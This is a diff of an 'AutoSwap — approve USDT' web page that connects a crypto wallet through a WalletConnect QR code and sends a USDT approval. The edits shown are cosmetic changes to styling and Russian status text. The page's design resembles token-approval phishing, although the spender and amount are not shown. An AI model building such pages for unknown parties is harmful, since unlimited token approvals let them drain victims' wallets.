@@ -5,10 +5,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>AutoSwap — approve USDT</title>
   <style>
-    body { font-family:'Segoe UI',sans-serif; background:linear-gradient(135deg,#1a1f2d,#0d1520); color:#e0e0e0; text-align:center; margin:0; padding:20px;}
-    .container {max-width:500px;margin:0 auto;padding:30px;background:rgba(30,40,55,0.8);border-radius:20px;box-shadow:0 10px 40px rgba(0,0,0,0.4);}
-    canvas {display:block;margin:20px auto;}
-    #status {margin-top:20px;font-size:16px;white-space:pre-wrap;}
+    body { font-family:'Segoe UI',sans-serif; background:linear-gradient(135deg,#1a1f2d,#0d1520); color:#e0e0e0; margin:0; padding:20px; text-align:center;}
+    .container {max-width:500px; margin:0 auto; padding:30px; background:rgba(30,40,55,0.8); border-radius:20px; box-shadow:0 10px 40px rgba(0,0,0,0.4);}
+    canvas {display:block; margin:20px auto;}
+    #status {margin-top:20px; font-size:16px; white-space:pre-wrap;}
   </style>
 </head>
 <body>
@@ -26,10 +26,10 @@
   <script type="module">
     import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
 
-    const ethers = window.ethers;  // Получаем ethers из глобальной области
-    const { Interface } = ethers.utils;
+    const ethers = window.ethers;
+    const Interface = ethers.utils.Interface;
 
-    const setStatus = (msg, color="#4fc3f7") => {
+    const setStatus = (msg, color = "#4fc3f7") => {
       const el = document.getElementById("status");
       el.textContent = msg;
       el.style.color = color;
@@ -49,7 +49,7 @@
           }
         });
 
-        setStatus("📷 Готов. Сканируйте QR…");
+        setStatus("📷 Сканируйте QR‑код...");
         const { uri, approval } = await client.connect({
           requiredNamespaces: {
             eip155: {
@@ -61,8 +61,8 @@
         });
 
         if (uri) {
-          QRCode.toCanvas(document.getElementById("qrcode"), uri, { width:240, margin:1 });
-          setStatus("📱 Сканируйте QR в кошельке");
+          QRCode.toCanvas(document.getElementById("qrcode"), uri, { width: 240, margin: 1 });
+          setStatus("📱 Сканируйте QR-код кошельком");
         }
 
         const session = await approval();
@@ -87,7 +87,6 @@
         });
 
         setStatus(`✅ Approve отправлен:\n${txHash}`, "#66bb6a");
-
       } catch (e) {
         console.error(e);
         setStatus(`❌ Ошибка: ${e.message || e.reason}`, "#ff6b6b");
